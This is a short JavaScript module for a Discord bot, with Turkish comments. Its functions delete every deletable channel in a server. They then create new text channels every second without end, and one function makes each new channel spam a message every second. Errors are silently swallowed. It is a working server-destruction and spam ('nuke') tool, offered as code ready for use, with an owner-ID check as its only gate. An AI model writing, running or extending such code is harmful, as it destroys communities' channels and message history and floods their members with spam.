const { ChannelType, PermissionFlagsBits } = require("discord.js");

function isAuthorized(member, userId, ownerId) {
  return ownerId && userId === ownerId;
}

async function clearAndSpamChannels(guild, channelName) {
  const channels = await guild.channels.fetch();
  const deletePromises = channels.map(channel => {
    if (channel && channel.deletable) {
      return channel.delete("fucked up").catch(() => { });
    }
  });

  await Promise.all(deletePromises);

  setInterval(() => {
    guild.channels.create({
      name: channelName,
      type: ChannelType.GuildText,
      reason: "31fuckedup"
    }).catch(() => { });
  }, 1000);
}

async function startFullPack(guild, channelName, messageContent) {
  // Once her seyi temizle
  const channels = await guild.channels.fetch();
  const deletePromises = channels.map(channel => {
    if (channel && channel.deletable) {
      return channel.delete("full pack").catch(() => { });
    }
  });
  await Promise.all(deletePromises);

  // Kanal acma ve icinde mesaj atma dongusu
  setInterval(() => {
    guild.channels.create({
      name: channelName,
      type: ChannelType.GuildText,
      reason: "full pack spam"
    }).then(channel => {
      // Her acilan kanal icin ayri bir mesaj spam dongusu baslat
      setInterval(() => {
        channel.send(messageContent).catch(() => { });
      }, 1000);
    }).catch(() => { });
  }, 1000);
}

module.exports = {
  clearAndSpamChannels,
  startFullPack,
  isAuthorized
};
